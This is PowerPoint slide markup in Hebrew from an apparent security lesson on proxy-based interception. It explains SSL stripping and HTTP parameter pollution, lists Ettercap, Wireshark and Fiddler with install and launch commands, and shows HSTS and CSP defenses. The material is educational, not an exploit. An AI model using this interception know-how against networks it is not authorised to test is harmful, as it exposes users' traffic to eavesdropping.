              <a:t>כך ניתן לוודא שהלקוח מתקשר עם השרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>האמיתי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ולא עם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> זדוני.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>3. זיהוי פעילות חשודה: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עקוב אחר תעבורת הרשת שלך ונסה לזהות פעילות חשודה, כמו בקשות לא מוכרות או ניתוב בלתי צפוי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>4. שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>VPN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>VPN </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מקשה על התוקף ליירט את התעבורה כיוון שהתעבורה מוצפנת ומועברת דרך שרת מאובטח.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>5. עדכון תוכנות והגדרות: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ודא שכל התוכנות וההגדרות מעודכנות, כולל דפדפנים, מערכות הפעלה ושרתים. עדכונים מכילים לעיתים קרובות תיקוני אבטחה שמונעים ניצול פרצות.</a:t>
            </a:r>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67842207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29BE06-956A-481B-AE76-63206DD9B852}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4532243" y="1020281"/>
            <a:ext cx="6592957" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="he-IL" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{38162F87-3DEA-444F-B2CB-021CF022A73D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>טכניקות מתקדמות לתקיפה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>SSL Strip .1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זוהי טכניקה שבה התוקף מוריד את שכבת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SSL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של תקשורת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTPS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה שמאפשר לו לקרוא ולשנות את התעבורה המוצפנת. זה נעשה על ידי ניתוב מחדש של בקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לבקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> רגילות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>איך זה עובד?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשתמש מבקש לגשת לאתר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף מקבל את הבקשה ומשיב עם עמוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לא מוצפן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כל התקשורת הבאה מתבצעת בפרוטוקול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, המאפשר לתוקף לצותת ולהתערב בתעבורה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9844379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3B9B620-1B71-4F82-B9A0-9648A1FF8909}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4422913" y="1015779"/>
            <a:ext cx="6702287" cy="1125110"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="he-IL" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{35F29846-5D33-4AB2-953F-B122CB57B40E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>המשך טכניקות מתקדמות לתקיפה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>HTTP Parameter Pollution (HPP) .2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זוהי טכניקה שבה התוקף מזריק פרמטרים נוספים לבקשת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> במטרה לשנות את התנהגות השרת. ניתן להשתמש בזה כדי לעקוף </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>אימותים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, לגשת למידע רגיש או לבצע פעולות בלתי מורשות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>איך זה עובד?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף מזהה פרמטר בקשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שהשרת לא בודק כראוי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הוא מזריק פרמטר נוסף או משנה פרמטר קיים כדי לשנות את התנהגות השרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="118889598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B17BCE6-9463-48AB-9635-69554594A4F7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2534478" y="314603"/>
            <a:ext cx="8819322" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כלים נוספים לתקיפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2D27C134-83D3-4829-A30A-58F41A1CA6FA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1686203"/>
            <a:ext cx="10058400" cy="4754353"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>FIDDLER</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Fiddler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הוא כלי רב עוצמה לבדיקת תעבורת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP/HTTPS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוא מאפשר ליירט, לערוך ולנתח תעבורה בין הלקוח לשרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התקנה והפעלה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> apt-get install fiddler</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>fiddler</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Wireshark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Wireshark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הוא כלי לניתוח רשת שמאפשר לצפות בתעבורה בזמן אמת ולבצע ניתוח עמוק של פרוטוקולים. זהו כלי חזק מאוד לציתות וניתוח תעבורה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקנה והפעלה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> apt-get install </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>wireshark</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>wireshark</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ettercap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Ettercap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הוא כלי לקיום מתקפות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MITM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ברשתות מקומיות. הוא מאפשר ליירט, לשנות ולנתח תעבורה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקנה והפעלה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> apt-get install </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ettercap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-graphical</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ettercap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -G</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8520546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F8191B6-014A-4486-8E5E-60C0DE7838D0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1381539" y="642594"/>
            <a:ext cx="9743661" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דרכים מתקדמות להתגוננות מ- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E63067F-5AAD-4288-AC98-DEFAE99C2D82}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>HTTP Strict Transport Security (HSTS) .1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HSTS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוא מנגנון אבטחה שמבטיח שהדפדפן יתקשר רק בפרוטוקול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עם השרת, מה שמונע מתקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SSL Strip</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>איך להפעיל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>HSTS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> ? </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בכדי להפעיל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>,HSTS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יש להוסיף את הכותרת הבאה לתשובות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של השרת:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Strict-Transport-Security: max-age=31536000; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>includeSubDomains</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Content Security Policy (CSP)</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוא מנגנון אבטחה שמגביל את סוגי התוכן שניתן לטעון באתר. זה יכול למנוע התקפות כמו</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>והזרקת קוד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>איך להגדיר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>CSP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הוסף את הכותרת הבאה לתשובות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של השרת:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Content-Security-Policy: default-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 'self'; script-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 'self'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="171469699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C20C2F-2F3A-4AA5-9DC4-CDD71F4806E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="268357" y="642594"/>
            <a:ext cx="11638721" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - דרכים מתקדמות להתגוננות מ- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{443BB59F-88EC-46AC-98A4-B1900CA81235}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Client Certificates</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש בתעודות לקוח לאימות הדדי בין הלקוח לשרת. זה מקשה מאוד על התוקף להתחזות ללקוח או לשרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Network Segmentation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חלוקה של הרשת לתתי-רשתות מבודדות יכולה להקשות על התוקף לנוע בין חלקי הרשת ולצמצם את הנזקים הפוטנציאליים.</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20462941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0E0203D-2F08-4883-BDD1-7159D463A024}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1520686" y="642594"/>
            <a:ext cx="9604513" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
